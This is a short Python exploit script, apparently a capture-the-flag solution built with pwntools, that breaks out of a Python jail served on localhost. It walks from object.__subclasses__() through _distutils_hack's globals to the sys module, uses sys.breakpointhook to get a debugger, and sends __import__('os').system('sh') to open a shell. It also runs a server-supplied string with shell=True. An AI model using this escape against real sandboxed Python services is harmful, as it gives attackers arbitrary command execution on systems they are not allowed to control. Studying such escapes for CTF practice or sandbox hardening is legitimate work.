from pwn import *
from subprocess import check_output


#p = process(['python3', 'the.py'])
p = remote('localhost', 5000)

p.recvline()
p.sendline(check_output(p.recvline().strip(),shell=True))


def ga(attr: str):
    p.sendline(b'1')
    p.sendline(attr.encode())


def call():
    p.sendline(b'2')


for i in range(16):
    ga('__class__')
    ga('__base__')
    ga('__subclasses__')
    call()  # object.__subclasses__()
    
    # get the last item of the list
    ga('__reversed__')
    call()
    ga('__next__')
    call()  # object.__subclasses__()[-1] => _distutils_hack.shim
    
    # use https://github.com/pypa/setuptools/blob/main/_distutils_hack/__init__.py#L220 to see which methods give builtins
    ga('__enter__')
    ga('__globals__')  # _distutils_hack.shim.__enter__.__globals__ => _distutils_hack.__dict__
    if i < 15:
        ga('popitem')  # pop key:value pairs until the last value is <module 'sys'>
        call()
        continue
    ga('values')
    call()
    ga('__reversed__')
    call()
    ga('__next__')
    call()  # <module 'sys'>
    ga('breakpointhook')  # sys.breakpointhook() is equivalent to breakpoint
    call()
    p.sendline(b'__import__("os").system("sh")')  # win

p.interactive()

